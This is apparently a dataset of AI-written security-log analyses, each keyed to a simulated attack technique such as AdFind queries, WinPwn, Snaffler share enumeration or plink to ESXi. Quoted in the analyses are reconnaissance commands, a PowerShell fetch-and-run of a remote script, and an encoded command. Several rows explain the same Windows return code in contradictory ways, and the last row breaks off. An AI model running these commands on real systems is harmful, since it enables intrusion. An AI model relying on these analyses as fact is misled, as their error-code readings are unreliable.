Directory Name,AI Response
Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy,"Based on the provided Windows event logs, here is the detailed analysis:

1. **PowerShell Logs:**
   - The PowerShell execution event logs indicate the command `powershell.exe & {get-addefaultdomainpasswordpolicy}` was executed. This command queries Active Directory for the default domain password policy. 
   - Such a command is typically legitimate and used by administrators to audit domain policies. However, it can also be indicative of reconnaissance activity if run by an unauthorized user.

2. **System Logs:**
   - The system logs detail time change events executed by the process `svchost.exe`. Time changes can be normal system operations or part of time synchronization processes.
   - Nothing inherently malicious stands out in these logs.

3. **Sysmon Logs:**
   - The process executions involving `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are common and part of regular administrative operations and system events.
   - The processes are executed by the user `SERVER002\admin_test`, which appears to be an administrative account. Such executions are expected in legitimate administrative activities.
   - The command `whoami.exe` is used to obtain user information, which again could be benign, but if unauthorized, may indicate reconnaissance actions.

4. **Security Logs:**
   - Like the system logs, the security logs indicate time change activities coordinated by the `svchost.exe` process and executed by the `LOCAL SERVICE` account. These are typical and do not indicate compromise.

5. **Application Logs:**
   - The application log mentioning the `Software Protection Platform Service` is routine and part of the Windows operating system’s licensing service. The entry does not indicate malicious activity.

**Summary and Assessment:**

- The PowerShell command and `whoami.exe` execution raise slight concerns, as they can be used for reconnaissance. However, there is no definitive evidence they were executed with malicious intent based on the current context.
- Other log entries like time changes and processes executed are routine and suggest scheduled system and administrative tasks rather than malicious activity.

**Resolution:**
- **SUSPICIOUS**: While there is no concrete evidence of malicious activity, the PowerShell command querying domain policies and the command-line execution of `whoami.exe` warrants further examination. Investigate the user `admin_test` to verify if they had legitimate reasons to execute these commands and if they were expected activities according to company IT policies. Also, ensure no abnormal privilege escalation or unauthorized access was involved.

Proceed to verify and validate the user activities, check network logs for any unusual outbound connections, and confirm whether this aligns with regular administrative actions."
WinPwn - generaldomaininfo,"Based on the provided logs, here are the detailed observations and assessments:

1. **Security Logs:**
   - There are multiple EventID 4616 logs related to the change in system time. It shows the Local Service account and the `svchost.exe` process involved. Changing system time can be typical behavior for synchronization, but if there is no corresponding reason, it might indicate attempts to manipulate time records for covering tracks. However, context on legitimate administrative activity is lacking, making it hard to judge definitively.

2. **PowerShell Logs:**
   - There is evidence of PowerShell downloading and executing a script from a URL (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`). This behavior is suspicious because downloading and executing scripts from the internet, especially from public repositories, is often associated with malicious behavior or administrative oversight not adhering to security best practices.

3. **Application Logs:**
   - The logs related to Windows Defender indicate it is turned on (`SECURITY_PRODUCT_STATE_ON`), which is a positive sign for host protection.
   - Most of the logs are related to service status changes (e.g., EdgeUpdate), which in isolation do not suggest malicious activity.

4. **System Logs:**
   - Mainly contain information about time adjustments and system operations involving the kernel, which doesn't directly suggest malicious activity by themselves without further context.

5. **Sysmon Logs:**
   - The execution of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, etc., by the `admin_test` user is noted. Such command-line utility usage can often occur legitimately in administrative or technical troubleshooting contexts. However, things like `wevtutil.exe` could also be used for log clearing, which might be suspicious if seen without legitimate justification.
   - The critical observation again is the PowerShell execution with events indicated in the Security log, related to downloading and executing an external script from GitHub. This can be a potential indicator of malicious activity, given the nature of the command essentially executing external content.
   - Repeated operations involving Microsoft Edge Update processes, as well as typical update operations, do not indicate suspicious activities.

**Assessment:**
- The primary concern arises from the **PowerShell event logs** and behavior. Downloading and executing scripts from an internet source is a red flag for potential compromise or at least risky behavior, especially when tied with administrative actions.
- The normal activities related to Edge and Windows system updates appear benign.

**Resolution: SUSPICIOUS**
- Actionable steps should include verifying the intent behind the PowerShell script execution and confirming if it was an authorized administrative action or something that needs attention. Additionally, a review of any changes in system time or command executions should be corroborated with the justification or intent, matching administrative logs, or known activity patterns for the user `admin_test`.
- Further investigation on the source, usage, and potential consequences of the script executed should continue to determine if it posed any malicious threat."
ESXi - VM Discovery using ESXCLI,"### Detailed Analysis of the Logs:

**Event Type Analysis:**

1. **Security Logs:**

   - **EventID 4624 (Logon):** Typically, a logon event which shows successful logins. The entries show logons with Logon Type 5, indicating a service startup. The subject user and target user are ""SYSTEM"", which is typical for a system/service account login.
   
   - **EventID 4672 (Special Privileges Assigned to New Logon):** These events are normal when a user with potentially elevated privileges logs on. The privileges listed (e.g., SeDebugPrivilege) are standard for a system account but should be reviewed for unexpected users.

   - **EventID 4798 (User Account Enumerated):** Indicates an enumeration of user accounts. This repeated enumeration for various user accounts may indicate preparatory actions for an attack or a routine query operation.

   - **EventID 5379 (Credential Manager Credentials Read):** These entries usually indicate an application retrieving stored credentials. The repeated access attempts with ReturnCode ""3221226021"" (STATUS_DLL_INIT_FAILED) suggest possible malicious intent or a failed legitimate application authorization.

2. **Sysmon Logs:**

   - **EventID 1 (Process Creation):** 
     - Admin_test user executed a PowerShell instance (`powershell.exe`), which is a common initial vector for attacks, but no further abnormal actions are recorded with it.
     - Execution of `wevtutil.exe` and multiple instances of `cmd.exe` and `plink.exe` suggest that command line operations were being performed, possibly indicative of file transfers or remote interactions. The use of `plink.exe` with apparent credentials to a remote server (""root"" user) is a high-risk activity and could imply unauthorized remote communications.
   
   - **EventID 5 (Process Termination):** Indicates termination of processes initiated in earlier logs, typical of the completion of their execution cycles. The specific focus on tools like `plink.exe` may suggest activities attempting stealthy remote access. 

3. **Other Logs:**

   - **Application and PowerShell logs:** Not enough detail is provided to determine malicious activity.

**Assessment of Suspicious Activity:**

- The execution of PowerShell and `plink.exe`, especially with a root user and embedded credentials, raises significant concerns about unauthorized remote access or data exfiltration activities.
- Frequent user enumeration and credential access attempts with system-level accounts suggest potential reconnaissance or exploitation tactics.
- Command line and process creations linked with `plink.exe` indicate unauthorized, potentially malicious processes being executed.

### Assessment:

Given the combination of:
- Frequent user enumeration
- Abnormal credential access logs (5379)
- Execution patterns involving tools often used for malicious purposes, such as `plink.exe` with potentially hardcoded credentials
- Elevated privileges and process executions indicative of lateral movement or data exfiltration

The activity within these logs can be categorized as:

- **MALICIOUS**

### Guidance on How to Proceed:

1. **Isolate the Affected System:** To prevent further potential unauthorized access or spread.
2. **Perform Forensic Analysis:** Investigate the processes involving `plink.exe` and confirm whether unauthorized access occurred.
3. **Review Policies:** Secure credentials and restrict the use of PowerShell and unauthorized command-line executions with proper logging.
4. **Implement Network Monitoring:** To detect anomalous outbound connections, especially from users like `admin_test`.
5. **Update Credentials:** Especially for high-privileged accounts noted in the logs.
6. **Patch & Secure:** Ensure all systems are patched against known vulnerabilities and secure configuration practices are in place.

A detailed investigation and assessment of the affected systems and user activity logs are recommended to ascertain the full impact and entry point of the malicious activity."
WinPwn - printercheck,"Upon examining the provided Windows event logs, several observations and points of concern arise:

1. **Sysmon Logs:**
   - The Sysmon logs reveal multiple instances where standard system utilities such as `HOSTNAME.EXE`, `whoami.exe`, `conhost.exe`, and `wevtutil.exe` were executed. These are not typically malicious themselves but can be leveraged in malicious scripts or batch processes to gather information or manipulate the system. 
   - A notably suspicious entry is the execution of `PowerShell.exe` with command-line arguments indicating the use of `wget` to download and execute a script from a GitHub repository (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`). This represents a significant red flag as this behavior aligns with common tactics used by adversaries to download and execute malicious scripts or tools.

2. **Security Logs:**
   - The security logs contain time change events by the `LOCAL SERVICE` account, which are normal operations related to time synchronization and not inherently suspicious in themselves.

3. **System Logs:**
   - Similar to the security logs, these system logs reflect routine operations of the Windows Time Service (W32Time). Time source selections and other kernel activities recorded here do not suggest any anomalous behavior.

4. **Windows PowerShell Logs:**
   - The PowerShell logs present more suspicious activity in line with the Sysmon logs. A PowerShell session executed a script downloaded from the internet, a sign of potential compromise or misuse. The session was initiated with elevated privileges (HIGH Integrity Level), indicating privilege escalation may have occurred.

5. **Application Logs:**
   - The logs contain events related to EdgeUpdate services and Windows Defender notifications. The presence of `EdgeUpdate` events aligns with typical update processes, whereas the Windows Defender events indicate the system's antivirus status is active, though no threats have been explicitly flagged.

### Assessment

Conclusively, the primary indicator of potential malicious activity stems from the execution of an unverified PowerShell script from the internet. This behavior is highly suspicious and representative of potential malicious actions. This incident should be investigated further to determine the intent and impact of the script executed.

### Resolution

**Resolution: MALICIOUS**
- The PowerShell activity involving script download and execution signifies a potentially serious security incident. Immediate further investigation and mitigation efforts are required.

### Recommended Actions

- **Immediate Incident Response:** Engage your incident response team to analyze the downloaded script.
- **Containment:** Block the involved domain or IPs at the network level to prevent further downloads.
- **System Analysis:** Review the endpoint for further Indicators of Compromise (IoCs), focusing on unauthorized changes or network communications.
- **User Awareness:** Educate users, especially those with privileged accounts, on recognizing and preventing such tactics.
- **Review and Strengthen Security Posture:** Implement tighter PowerShell execution policies and network segmentation as appropriate.

Given the present findings, it is crucial to rapidly address and contain this threat to mitigate potential damage or data exfiltration."
Security Software Discovery - AV Discovery via WMI,"In this analysis, I reviewed the provided event logs across the Windows PowerShell, Application, Security, Sysmon, and System logs. Here are the key observations:

### Analysis

1. **Security Log Analysis:**
   - All events are of EventID 4616, which indicates system time changes. The logs show that the `LOCAL SERVICE` account adjusted the system time twice within the same minute. While such actions are usually part of system operations, repeated changes in quick succession could be a red flag warranting further context or audit, especially given the very slight change (milliseconds) the second time. However, without additional context or repeated/erratic changes, this alone is not definitively suspicious.

2. **Sysmon Log Analysis:**
   - The events detail several process creations:
     - Multiple mentions of processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `wmic.exe`.
     - A remarkable entry involves `cmd.exe` executing `wmic.exe` to query `AntiVirusProduct` information. While this is not inherently malicious, it could be indicative of reconnaissance activity, especially if conducted by a non-standard user or outside of standard operating procedures.

3. **System Log Analysis:**
   - Primarily features events related to minimal system time changes and adjustments with `svchost.exe`. Nothing particularly suspicious stands out, considering these changes align with the Security logs.

### Suspicious but Not Conclusive Activity
- The combination of system time changes and the use of `wmic.exe` through `cmd.exe` could point towards some form of enumeration or system alteration likely by an administrator or an automated script. However, without evidence of unauthorized access or malicious payloads, it remains suspicious but not conclusively harmful.

### Conclusion
Given the current evidence:
- The need to further investigate the context of time changes and scripting use forms the basis for categorizing this activity as **SUSPICIOUS**.
- To proceed:
  - Conduct a conference with any involved administrators or system users to clarify intentions or validate actions that might explain these logs.
  - Cross-check with other logs sources or threat intelligence for patterns involving `wmic.exe` or similar behaviors.
  - Implement increased monitoring for any future similar activities or patterns to preempt potential malicious activity."
File and Directory Discovery (cmd.exe),"After a detailed analysis of the provided Windows event logs, I have identified the following activities:

### System Logs:
- The system log entries mostly involve time synchronization adjustments (EventID 24 and 1 related to time change) and Windows Update events (EventID 44).
- Frequent updates from the Windows Update Client suggest regular update checks and installations, which are typical system maintenance activities.

### Application Logs:
- The entries in the application log primarily pertain to the Software Protection Platform Service (EventID 16384), Windows Defender state, and edgeupdate services. These seem to reflect normal system operations, like license checks and update service stops.

### Sysmon Logs:
- The logs capture several process creation events (EventID 1) and file creation events (EventID 5).
- A noticeable event is a command run by `cmd.exe` that attempts to list directories and export data (Sysmon EventID 1 with the command `cmd.exe /c dir /s...`). This kind of activity could be indicative of reconnaissance or data collection commonly seen in intrusion activities.
- However, these events can also align with legitimate admin tasks or automated scripts.

### Security Logs:
- Numerous successful logon events (EventID 4624) and instances of privileges being granted (EventID 4672) are visible; these typically reflect normal user and system account activities.
- There is a pattern of credential validation failures (EventID 5379) involving Microsoft account checks, which could be related to incorrect credentials or misconfigured applications/services; however, the absence of further suspicious activity linked to these suggests they may be benign.

### Assessment:
The event logs show signs that could indicate both normal administrative activity and potential reconnaissance steps. The occurrence of directory listing operations and capturing of outputs is somewhat suspect, potentially aligning with initial stages of an attack.

### Resolution:
Given the absence of indications of privilege escalation, unusual network connections, or known malicious binaries, but considering the reconnaissance-like command observed, I classify this activity as **SUSPICIOUS**. Although there is no concrete evidence to deem these logs outright malicious, the reconnaissance-like pattern warrants further investigation.

### Guidance:
1. **Investigate the Source**: Identify the origin of the `cmd.exe` command for directory enumeration. Determine if it aligns with scheduled tasks or known administrative activity.
2. **Monitor for Recurrence**: Set up alerts for repeated or similar command executions, which might suggest ongoing reconnaissance.
3. **Review User Activity**: Verify the user activities associated with `admin_test`, especially regarding the usage patterns and access logs.
4. **Conduct a Threat Hunt**: Consider a more comprehensive security assessment or threat hunt to determine if these actions are part of a larger security incident.

This assessment and guidance will help to further verify the nature of the activities and ensure that the system remains secure."
System Time Discovery W32tm as a Delay,"Based on the analysis of the provided Windows event logs, the following observations were made:

1. **Time Change Events:**
   - Multiple entries in the Security and System logs indicate a time change (EventID 4616 in Security log and EventID 1 in System log).
   - These events indicate that the system clock was adjusted. While not inherently malicious, frequent or unexplained time changes can be indicative of potential tampering, possibly to cover tracks or align with malicious operations.

2. **Process Execution and Activity:**
   - The logs show numerous executions of common Windows utilities like `whoami.exe`, `conhost.exe`, and `cmd.exe`. Many of these appear to be related to legitimate system operations or user activity, like using `whoami.exe` to query the logged on user information.
   - `wevtutil.exe` and `svchost.exe` show multiple executions too, which are typical in a Windows environment but can be leveraged for malicious purposes. However, there is no immediate evidence in these logs suggesting abuse.
   - `MicrosoftEdgeUpdate.exe` appears frequently in the logs with numerous installations and update executions. Given that these are associated with Microsoft Edge, they appear to be part of a software update process.

3. **Integrity Levels and User Information:**
   - The logs indicate processes executed with high integrity levels, often by the `admin_test` user or NT AUTHORITY\SYSTEM, which is normal for administrative tasks and system-level processes respectively.
   - The presence of NT AUTHORITY usage is typical in system contexts; however, admin account activity should be monitored for unusual execution patterns.

4. **Edge Update Activity:**
   - A significant number of executed processes and service stops are related to `MicrosoftEdgeUpdate.exe`. This shows active updating of Microsoft Edge, which is normal maintenance behavior but should be monitored to ensure it is not masqueraded malicious software.

**Conclusion:**

- **Assessment:** The logs primarily show routine administrative and system activities such as time adjustments, process executions, and software updates. There is no clear indicator of malicious activity, although the time changes warrant a closer look to confirm the intent of these changes and validate them against legitimate administrative activities.

- **Resolution:** **SUSPICIOUS**

While no direct malicious activity is confirmed, the frequency of time change events and extensive edge update activities suggest further validation to ensure normal operations and not cover-ups for potential malicious actions. Conduct a deeper review of time change justifications and ensure all edge-related activities are expected and legitimate, especially in the context of recent patches or system updates."
Adfind - Query Active Directory Groups,"Here's the detailed analysis of the given logs:

### Security Log Analysis:

- **Event ID 4624 (Successful Logon)**: This event shows a successful logon for the SYSTEM account (S-1-5-18) using the ""Advapi"" logon process. Logon Type 5 indicates a service startup, which is common for SYSTEM logons. This event does not appear suspicious on its own.

- **Event ID 4672 (Special Privileges Assigned)**: This logs the SYSTEM account being granted special privileges. It's typical for this account to have high privileges, including SeDebugPrivilege. This event alone doesn't indicate an anomaly.

### Application Log Analysis:

- The Application logs show Windows Defender is active (SECURITY_PRODUCT_STATE_ON), indicating that basic antivirus processes are running. No suspicious activity here.

### Sysmon Log Analysis:

1. **SecurityHealthService.exe**: This process belongs to Windows Security and appears non-malicious.

2. **PowerShell Execution by SERVER002\\admin_test**: 
   - **Powershell.exe**: Is executed by an admin_test user. No command-line specifics available to determine intent, but monitoring PowerShell activity, especially from admin accounts, is crucial as it's commonly used in malicious activities.

3. **Frequent Execution of `wevtutil.exe` and `conhost.exe` by `admin_test`**:
   - **wevtutil.exe**: A legitimate tool used for managing event logs. Repeated execution could indicate unauthorized log tampering.
   - **conhost.exe**: A legitimate console host process; however, its repetitive launch requires scrutiny, particularly when paired with wevtutil.exe.

4. **Execution of HOSTNAME.EXE and WHOAMI.EXE**:
   - These commands display network-related and user identity information. Their simultaneous, high-frequency use suggests possible reconnaissance activities by the `admin_test` account, warranting further investigation.

5. **Execution of CMD.EXE with AdFind.exe**:
   - **AdFind.exe**: This is a known tool often used in red team operations and by adversaries for Active Directory enumeration. The command `cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\AdFind.exe"" -f (objectcategory=group)` is suspicious, indicating possible unauthorized directory queries.

### Conclusion:

Given the context, specific activities stand out as potentially malicious:
- Execution of **PowerShell** by a user account (admin_test) with elevated privileges, especially without clear command-line arguments, is suspicious.
- Repeated access to **event logs** via `wevtutil.exe` by the same account could indicate attempts to cover tracks or collect sensitive information.
- The use of **AdFind.exe** through command prompt suggests potential Active Directory enumeration, a common reconnaissance step in lateral movement and privilege escalation stages within a network.

### Resolution: **SUSPICIOUS**

While these activities don't conclusively prove a compromise, they warrant further investigation. It is advised to:
- Conduct a thorough analysis of the `admin_test` user's activities and review permission changes.
- Examine PowerShell logs to identify specific commands run by `admin_test`.
- Review historical logs for patterns or similar activities.
- Run a full antivirus/antimalware scan to detect any hidden threats.
- Consider applying tighter access controls and enable additional logging for enhanced monitoring."
Hostname Discovery (Windows),"**Detailed Analysis:**

Upon reviewing the logs from the Windows host, the following observations and analyses can be made:

### System log:
- **Time Synchronisation Events (EventID: 24 and 1):** The system log is dominated by time synchronization events, which are normal behaviors associated with svchost.exe processes. Time synchronization would typically involve services like the Windows Time Service adjusting time, which is seen here with time adjustments logged.

### Sysmon log:
- **Multiple executions of `wevtutil.exe` and `conhost.exe`:** These Sysmon entries display process creations originating from `wevtutil.exe` and `conhost.exe`. `wevtutil.exe` is a legitimate Windows executable used for querying event logs. Although its usage should be monitored, there is no direct indication of malicious behavior in these logs given the limited context.
- **Execution of `hostname.exe` and `whoami.exe`:** These are standard utilities used for system information enumeration. The context suggests they were executed by the `admin_test` user within their document directory and temp directory. Both are benign in nature under typical use.
- **`cmd.exe` used for executing benign commands:** The `cmd.exe` instance executed with argument `/c hostname`, which points to a non-suspicious use case. This is a typical command to verify system hostname.
- **Microsoft Edge Updates:** The majority of process activity related to MicrosoftEdgeUpdate.exe and related update components suggests routine update checks and operations for the Microsoft Edge browser.

### Application log:
- **Service stop for `edgeupdate`:** The entries here indicate the stopping of an edge update service, which aligns with the Sysmon entries covering Edge updates. The logs don't reflect any unusual behavior.

### Security log:
- **Logon/Privilege assignment (EventID: 4624, 4672):** Two logons by the `admin_test` user with associated privilege assignments (SeDebugPrivilege, SeBackupPrivilege, etc.) are logged via NT LAN Manager (NTLM). This is consistent with administrative actions on the host, suggesting administrative tasks rather than malicious actions.

### Assessment:
- There is no significant indication of privilege escalation or the execution of unusual or potentially harmful command-line arguments.
- The observed `admin_test` account actions fall within expected operational activities with the listed privileges, suggesting legitimate administrative tasks rather than cyber threat activity.

### Resolution:
- **BENIGN:** The log entries appear to document routine system, application, and user actions. There's no evidence of malicious activity, privilege misuse, or unauthorized access that can be distilled from the data provided.

### Guidance:
- Although current logs show benign activities:
  - Continue regular monitoring of administrative account actions (`admin_test`) for any anomalies against typical behavior patterns.
  - Implement/maintain robust alerting for unsanctioned use of powerful privileges (SeDebugPrivilege, SeImpersonatePrivilege) outside of typical admin operations.
- Encourage good operational hygiene, including ensuring that account credentials are managed securely and are unique to reduce risks of NTLM pass-the-hash or similar attacks.

End of analysis."
Reg query for AlwaysInstallElevated status,"Upon a thorough review of the provided logs, here is a detailed analysis of the events recorded in each log type, focusing on any indications of potential malicious activity:

### System Log
1. **Windows Update Events (EventID 44, 43, 19):**
   - The logs show typical activities related to Windows Updates, specifically for Microsoft Defender Antivirus. The updates appear to be completed successfully.
   - No indicators of malicious activity are noted here. This represents normal system operations.

### Security Log
1. **Credential Validation Events (EventID 5379):**
   - These logs indicate unsuccessful attempts to validate credentials associated with MicrosoftAccount and WindowsLive.
   - The return code `3221226021` typically implies an invalid handle, which might occur in routine operations or misconfigurations.
   - Given the context and lack of other corroborating evidence, these events do not immediately suggest malicious intent but should be verified to ensure no associated misconfigurations exist.

### Sysmon Log
1. **Process Creation and Termination (EventID 1 & 5):**
   - **Common Processes Observed:**
     - Multiple legitimate Windows processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe` are logged. These processes are standard components of Windows operations and their presence is expected in administrative tasks or scripting.
     - Execution of commands like `reg query` is noted. While querying the AlwaysInstallElevated registry keys could potentially be suspicious (used in privilege escalation techniques), there are no further signs of exploitation. This activity needs context for the reason for this querying.
   - **Defender Update Processes:**
     - Logs show normal execution of processes related to updates (e.g., `wuauclt.exe`, `AM_Delta.exe`, `MpSigStub.exe`) initiated by Windows Update, ending without any conspicuous activity.
   - **Process Execution by SYSTEM User:**
     - Processes like `MicrosoftEdgeUpdate.exe` and `svchost.exe` executed by the SYSTEM user are common and normal for system operations; no anomalies detected.

### Application Log
1. **Security Center Event (EventID 15):**
   - The log indicates Windows Defender is turned on, this is a routine operational check. No malicious activity here.

### Conclusion
Given the events analyzed, no explicit and definite signs of malicious activity or compromise were found in these logs. The presence of legitimate system processes and updates are indicative of normal operations. The queries to registry keys through `cmd.exe` could be suspicious in different contexts, but without related unusual activity or evidence of subsequent actions based on these queries, it remains just a point of minor interest.

#### Final Assessment: **SUSPICIOUS**
- While the activities logged are predominantly benign, the registry querying observed calls for a quick inspection. It's advisable to verify what initiated these queries and if they align with expected administrator behavior or authorized scripting. If no legitimate cause is found, further investigation might be warranted to rule out any misconfigurations or credentials misuses."
Enumerate all accounts on Windows (Local),"Upon reviewing the provided Windows event logs, I have identified several important points that stand out:

1. **Common Edge Update Activity**:
   - Numerous entries in the Sysmon logs pertain to the execution of `MicrosoftEdgeUpdate.exe`, a legitimate Microsoft process responsible for updating the Microsoft Edge browser. These entries include different command-line arguments and associated processes, such as:
     - `/update`
     - /`regsvc`
     - `/regserver`
     - `/svc`
     - `/ua /installsource core`
     - `/ping`
   - This activity appears to be routine software maintenance and update operations.

2. **System and Security Logs**:
   - The logs contain some time synchronization operation related to the Windows Time Service which appears as normal activity. Event logs related to svchost.exe and time adjustments are regularly seen in system operations.

3. **Potentially Suspicious Command Execution**:
   - There is a sequence of commands initiated by `cmd.exe` that involves uses of `net user`, `cmdkey.exe /list`, and localgroup commands. Such operations, especially when executed in a batch or rapid sequence, could indicate potential reconnaissance efforts or assessment of user accounts and credentials. However, these commands are also used legitimately in administrative tasks.
   - The series of executed processes include system utilities like `whoami.exe`, `HOSTNAME.EXE`, and various `net.exe` commands without evidence of malicious payload or unexpected external communication.

4. **Overall System Activity**:
   - The remaining logs generally depict software updates, system process activities (such as `sppsvc.exe`), and routine security checks (e.g., logging related to Windows Security Auditing). The usage of Windows utilities like `wevtutil.exe` and `conhost.exe` occurs but does not necessarily imply malicious actions unless correlated with additional suspicious indicators.

5. **Absence of Direct Evidence of Compromise**:
   - There are no explicit indicators of malware, such as unknown process execution, unauthorized external communications, privilege escalations, or policy violations within the logs.

### Assessment

Given the information listed in the logs and the analysis of these activities, the conclusion is:

- **Resolution**: **SUSPICIOUS**
  - While most activities appear common or related to legitimate processes, the batch of command executions involving `cmd.exe`, `net user`, and `cmdkey.exe /list` raises a mild flag. This could be normal system administration; however, it warrants additional scrutiny to confirm that these tasks are part of legitimate maintenance activities and not unauthorized reconaissance or lateral movement.

### Recommendations

1. **Further Investigation**: Review network logs, firewall logs, and any installed EDR (Endpoint Detection and Response) solutions for anomalous outbound connections or indicators of unauthorized data access or exfiltration.
2. **Access and Change Management**: Verify recent changes and access requests related to user `admin_test` and any documented maintenance activities performed on the system.
3. **Monitoring and Alerting**: Set up additional monitoring or logging expressly for sensitive command execution and review audit logs for user actions corresponding to the suspicious events.
4. **Security Awareness**: Conduct a review or training session for personnel with elevated privileges on secure practices for system command execution and monitoring."
Adfind - Enumerate Active Directory Computer Objects,"Upon reviewing the provided Windows event logs, the following analysis has been conducted:

### Security Log:
1. **Event ID 4624 (Successful Logon) and 4672 (Special Privileges Assigned):**
   - These events indicate successful logon attempts using the SYSTEM account (S-1-5-18), a typical event during system operations. The use of SYSTEM account is common, as it provides necessary privileges for system processes. Privileges like SeDebugPrivilege and SeTakeOwnershipPrivilege were seen assigned, which are typical for SYSTEM logons.

2. **Repeated Event ID 5379:**
   - These events indicate failed attempts to retrieve credentials from a Microsoft account (ReturnCode 3221226021 indicates ""Access is denied""). The persistent attempts to access Microsoft accounts are unusual and suggest potential credential enumeration attempts, which could be a threat indicator.

### Application Log:
- **Windows Defender Activity:**
  - The presence of multiple logs showing ""SECURITY_PRODUCT_STATE_ON"" indicates that Windows Defender is active and functional, which is expected and benign.

### Sysmon Log:
1. **Suspicious Process Creation:**
   - The execution of `cmd.exe` with the command line calling `AdFind.exe` is noteworthy. AdFind is a legitimate tool but often used by attackers to query Active Directory for reconnaissance purposes.
   - Other processes like `powershell.exe`, `wevtutil.exe`, and other Windows utilities seem to be running, which might be part of normal system operations. However, combined with the use of AdFind, this could be suspicious.

### System Log:
- The entries concerning Windows update processes seem benign and part of typical system update operations involving Microsoft Defender Antivirus.

### Overall Assessment:
Given the repeated failed attempts to access Microsoft accounts noted in the security logs and the use of `AdFind.exe` detailed in the Sysmon logs, these logs suggest potential unauthorized reconnaissance or probing activities. Therefore, the activities observed are deemed SUSPICIOUS.

### Actionable Guidance:
1. **Deeper Investigation:**
   - Conduct further analysis on the context and origin of the cmd.exe and AdFind.exe execution to verify if they are part of legitimate administrative activities.
   - Inspect network traffic and correlate with the timestamps of these events to ascertain if there is unauthorized data exfiltration.
  
2. **Credential Safeguarding:**
   - Review security policies and enhance monitoring for credential access operations, particularly focusing on Event ID 5379.

3. **Threat Hunting:**
   - Actively hunt for indicators of compromise that may correlate with known threats utilizing tools like AdFind.

Resolution: **SUSPICIOUS** - Logs contain activity that doesn't look right and requires more investigation."
Enumerate All Network Shares with Snaffler,"Upon analysis of the provided Windows event logs, several suspicious behaviors and potential indicators of compromise were observed:

1. **PowerShell Execution**: 
   - There are multiple events indicating the execution of PowerShell commands with encoded commands or scripted execution. Specifically, encoded commands stand out as potentially abnormal since encoding can be used to obfuscate the true nature of the commands being executed. The use of Invoke-Expression in conjunction with `cmd.exe` to execute a specific script located in a temporary directory is seen. The command `cmd /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe"" -a -o ""$env:temp\\datascriptOutput.txt""` raises a concern due to its execution from a non-standard path using potentially obfuscated methods. The use of `Stop-Process -Name ""script""` to potentially terminate a script also adds suspicion.

2. **Encoded Command Activities**:
   - PowerShell commands executed with encoded content, observed in the log entries, suggest attempts to hide the real intention of the command. Decoding the given base64 string `IABjAG0AZAAgAC8AYwAgACIAQwA6AFwAVQBzAGUAcgBzAFwAQQBEAE0ASQBOAF8AfgAxAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwALgAuAFwARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFMAbgBhAGYAZgBsAGUAcgAuAGUAeABlACIAIAAtAGEAIAAtAG8AIAAiACQAZQBuAHYAOgB0AGUAbQBwAFwAVAAxADEAMwA1AFMAbgBhAGYAZgBsAGUAcgBPAHUAdABwAHUAdAAuAHQAeAB0ACIAIAA=` reveals the execution of `cmd.exe` with similar suspicious arguments as noted above, suggesting execution of possibly unauthorized scripts.

3. **Security Privileges**:
   - There are security log events (ID 4672) where elevated permissions are granted consistent with privileges needed for critical operations like backup, restore, and debug. This, combined with suspicious command execution, could be indicative of privilege escalation or preparation for additional malicious activity.

4. **Sysmon Logs**:
   - The Sysmon logs indicate several instances of command-line executions with potentially suspicious arguments. Processes like `powershell.exe`, `cmd.exe`, and unconventional file paths suggest attempts at stealth or performing operations that are not typical for regular users.

5. **Miscellaneous Observations**:
   - Routine operations by Microsoft Edge Update processes are seen, which are mostly benign but serve as potential vectors if malware disguises itself under legitimate processes. These show no direct involvement in the suspicious activities identified.

**Assessment**:
Based on the analysis, the activities in the logs point towards potentially malicious behavior due to the combination of encoded PowerShell commands, unusual command paths, use of Invoke-Expression, and activity under elevated privileges. While the purpose of the script file being executed is not clear, the methods of execution suggest obfuscation and potential unauthorized usage.

**Resolution**: **MALICIOUS**

**Guidance**: 
1. Confirm the legitimacy of the `script.exe` present within the specified path. If unauthorized, it should be removed immediately.
2. Review user activities, such as login events and privilege escalations, for anomalies.
3. Investigate the system for other indicators of compromise and consider a full security audit.
4. Implement enhanced logging and monitoring for PowerShell and other critical applications to detect similar future activities.
5. Consider isolating the affected machine from the network and conducting forensic analysis if new or additional threats are identified."
Enumerate Active Directory Computers with ADSISearcher,"The logs provided contain events from various log categories, including Windows PowerShell, Sysmon, Security, System, and Application logs. Here is a detailed analysis of the logs concerning any potential malicious activities:

### Analysis:

**Windows PowerShell Log:**

- The PowerShell logs show a series of HostApplications executing scripts that contain potentially legitimate queries related to computing properties. The command `{([script]""objectcategory=computer"").FindAll(); ([script]""objectcategory=computer"").FindOne()}` appears in multiple entries, indicating a script that was run to query computer object categories. While the nature of the script is not inherently malicious, the repetitive execution might be unusual if not associated with a known administrative task.

**Sysmon Log:**

- A large number of process creation events are logged, primarily from system components such as `wevtutil.exe`, `conhost.exe`, and `powershell.exe` running under the user `SERVER002\admin_test`. 
- It’s notable that `powershell.exe` is executing the same script seen in the PowerShell logs. The script execution context includes `wsmprovhost.exe`, which is a legitimate system component for hosting WMI remote providers but could be problematic if part of evasive or improperly authorized activity.
- Most processes, including `wuauclt.exe` and `MicrosoftEdgeUpdate.exe`, appear usual for system updates and maintenance tasks, with no explicit signs of process tampering or unknown executables executing.

**Security Log:**

- The security logs exhibit numerous `5379` events, indicating credential validation checks that failed. These are correlated with querying Microsoft accounts (e.g., `MicrosoftAccount:user=02txoixylodcstop`). The consistent failure returns a specific error code (`3221226021`) related to an invalid parameter.
- Logon event `4624` and privileged actions `4672` show SYSTEM-level activities aligned with regular service maintenance. There appears to be no unauthorized privilege escalation.

**System Log:**

- The System logs reflect Windows Update activities, specifically the application of a security intelligence update for Microsoft Defender Antivirus, which is common and expected for system security updates.

